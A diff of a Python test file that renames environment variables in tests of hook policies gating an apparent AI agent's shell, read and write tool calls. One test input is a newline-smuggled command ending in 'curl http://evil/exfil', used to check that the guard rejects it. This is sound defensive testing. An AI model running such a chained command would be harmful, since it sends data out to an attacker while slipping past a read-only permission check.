-        with patch.dict(os.environ, {"METDSL_WORKFLOW_MODE": "1"}, clear=False):
+        with patch.dict(os.environ, {"ATMOFAB_WORKFLOW_MODE": "1"}, clear=False):
             with redirect_stdout(out):
                 code = cli.main(
                     [
@@ -3503,7 +3503,7 @@ class WriteToolExtensionPolicyTests(unittest.TestCase):
             target = results / "abc.txt"
             target.write_text("oversized gate output", encoding="utf-8")
 
-            env = {"METDSL_WORKFLOW_MODE": "1", "METDSL_ORCHESTRATION_ID": "o"}
+            env = {"ATMOFAB_WORKFLOW_MODE": "1", "ATMOFAB_ORCHESTRATION_ID": "o"}
             with patch.dict(os.environ, env, clear=False):
                 self.assertTrue(
                     _is_auto_approvable_readonly_bash(f"cat {target}", repo))
@@ -3515,8 +3515,8 @@ class WriteToolExtensionPolicyTests(unittest.TestCase):
                     _is_auto_approvable_readonly_bash(f"cat {other}", repo))
             # CONTROL — without the host-set orchestration id there is no private
             # home to recognise, so the pre-issue-#63 answer stands.
-            with patch.dict(os.environ, {"METDSL_WORKFLOW_MODE": "1"}, clear=False):
-                os.environ.pop("METDSL_ORCHESTRATION_ID", None)
+            with patch.dict(os.environ, {"ATMOFAB_WORKFLOW_MODE": "1"}, clear=False):
+                os.environ.pop("ATMOFAB_ORCHESTRATION_ID", None)
                 self.assertFalse(
                     _is_auto_approvable_readonly_bash(f"cat {target}", repo))
 
@@ -3545,7 +3545,7 @@ class WriteToolExtensionPolicyTests(unittest.TestCase):
             target = results / "abc.txt"
             target.write_text("oversized gate output", encoding="utf-8")
 
-            env = {"METDSL_WORKFLOW_MODE": "1", "METDSL_ORCHESTRATION_ID": "o"}
+            env = {"ATMOFAB_WORKFLOW_MODE": "1", "ATMOFAB_ORCHESTRATION_ID": "o"}
             with patch.dict(os.environ, env, clear=False):
                 self.assertTrue(_is_persisted_tool_result_read(
                     repo, "substep", arid, str(target)))
@@ -3584,7 +3584,7 @@ class WriteToolExtensionPolicyTests(unittest.TestCase):
             target = results / "abc.txt"
             target.write_text("oversized gate output", encoding="utf-8")
 
-            env = {"METDSL_WORKFLOW_MODE": "1", "METDSL_ORCHESTRATION_ID": "o"}
+            env = {"ATMOFAB_WORKFLOW_MODE": "1", "ATMOFAB_ORCHESTRATION_ID": "o"}
             with patch.dict(os.environ, env, clear=False):
                 decision, _run_id, out_of_repo = _evaluate_bash_read_manifest_policy(
                     decoded=HookInput(
@@ -3998,7 +3998,7 @@ class WriteToolExtensionPolicyTests(unittest.TestCase):
                 "tool_input": {"command": f"cat foo > {target}"},
             }
             out = io.StringIO()
-            with patch.dict(os.environ, {"METDSL_WORKFLOW_MODE": "1"}, clear=False):
+            with patch.dict(os.environ, {"ATMOFAB_WORKFLOW_MODE": "1"}, clear=False):
                 with redirect_stdout(out):
                     code = cli.main(
                         [
@@ -4036,7 +4036,7 @@ class WriteToolExtensionPolicyTests(unittest.TestCase):
                 "tool_input": {"command": "grep -n foo bar.txt ; echo \"e=$?\""},
             }
             out = io.StringIO()
-            with patch.dict(os.environ, {"METDSL_WORKFLOW_MODE": "1"}, clear=False):
+            with patch.dict(os.environ, {"ATMOFAB_WORKFLOW_MODE": "1"}, clear=False):
                 with redirect_stdout(out):
                     code = cli.main(
                         [
@@ -4075,7 +4075,7 @@ class WriteToolExtensionPolicyTests(unittest.TestCase):
                 "tool_input": {"command": "cat a.txt\ncurl http://evil/exfil"},
             }
             out = io.StringIO()
-            with patch.dict(os.environ, {"METDSL_WORKFLOW_MODE": "1"}, clear=False):
+            with patch.dict(os.environ, {"ATMOFAB_WORKFLOW_MODE": "1"}, clear=False):
                 with redirect_stdout(out):
                     code = cli.main(
                         [
@@ -4117,7 +4117,7 @@ class WriteToolExtensionPolicyTests(unittest.TestCase):
                 "tool_input": {"patch": patch_text},
             }
             out = io.StringIO()
-            with patch.dict(os.environ, {"METDSL_WORKFLOW_MODE": "1"}, clear=False):
+            with patch.dict(os.environ, {"ATMOFAB_WORKFLOW_MODE": "1"}, clear=False):
                 with redirect_stdout(out):
                     code = cli.main(
                         [
@@ -4162,7 +4162,7 @@ class GrepGlobReadGuardTests(unittest.TestCase):
             "tool_input": tool_input,
         }
         out = io.StringIO()
-        with patch.dict(os.environ, {"METDSL_WORKFLOW_MODE": workflow_mode}, clear=False):
+        with patch.dict(os.environ, {"ATMOFAB_WORKFLOW_MODE": workflow_mode}, clear=False):
             with redirect_stdout(out):
                 code = cli.main(
                     [
@@ -4736,7 +4736,7 @@ class BashReadManifestGuardTests(unittest.TestCase):
             "tool_input": {"command": command},
         }
         out = io.StringIO()
-        with patch.dict(os.environ, {"METDSL_WORKFLOW_MODE": workflow_mode}, clear=False):
+        with patch.dict(os.environ, {"ATMOFAB_WORKFLOW_MODE": workflow_mode}, clear=False):
             with redirect_stdout(out):
                 code = cli.main(
                     [
@@ -4972,7 +4972,7 @@ class BashReadManifestGuardTests(unittest.TestCase):
                     "tool_input": {"file_path": target},
                 }
                 out = io.StringIO()
-                with patch.dict(os.environ, {"METDSL_WORKFLOW_MODE": "1"}, clear=False):
+                with patch.dict(os.environ, {"ATMOFAB_WORKFLOW_MODE": "1"}, clear=False):
                     with redirect_stdout(out):
                         code = cli.main(
                             [
@@ -5275,7 +5275,7 @@ class ReadDecisionAccessLogTests(unittest.TestCase):
             "tool_input": {"file_path": file_path},
         }
         out = io.StringIO()
-        with patch.dict(os.environ, {"METDSL_WORKFLOW_MODE": "1"}, clear=False):
+        with patch.dict(os.environ, {"ATMOFAB_WORKFLOW_MODE": "1"}, clear=False):
             with redirect_stdout(out):
                 code = cli.main(
                     [
@@ -5702,7 +5702,7 @@ class BashWriteTargetGrammarTests(unittest.TestCase):
             "tool_input": {"command": command},
         }
         out = io.StringIO()
-        with patch.dict(os.environ, {"METDSL_WORKFLOW_MODE": "1"}, clear=False):
+        with patch.dict(os.environ, {"ATMOFAB_WORKFLOW_MODE": "1"}, clear=False):
             with redirect_stdout(out):
                 code = cli.main(
                     [
@@ -5852,7 +5852,7 @@ class BashWriteTargetGrammarTests(unittest.TestCase):
         the DEV layer runs `tools/hooks/dev_cli.py`. What this pins is therefore about a
         LEAF outside workflow mode, which is the shape a standalone or misconfigured
         launch produces, and the judgement is unchanged: the refusal is workflow-only.
-        The Bash branch is gated on `METDSL_WORKFLOW_MODE == "1"` (`cli.py`'s
+        The Bash branch is gated on `ATMOFAB_WORKFLOW_MODE == "1"` (`cli.py`'s
         step 3), and the operator owns the machine — refusing their `cp` would be
         an over-refusal with no leaf-shortcut to defend against.
         """
@@ -5870,7 +5870,7 @@ class BashWriteTargetGrammarTests(unittest.TestCase):
                 "tool_input": {"command": "cp a.txt b.txt"},
             }
             out = io.StringIO()
-            with patch.dict(os.environ, {"METDSL_WORKFLOW_MODE": "0"}, clear=False):
+            with patch.dict(os.environ, {"ATMOFAB_WORKFLOW_MODE": "0"}, clear=False):
                 with redirect_stdout(out):
                     code = cli.main(
                         [
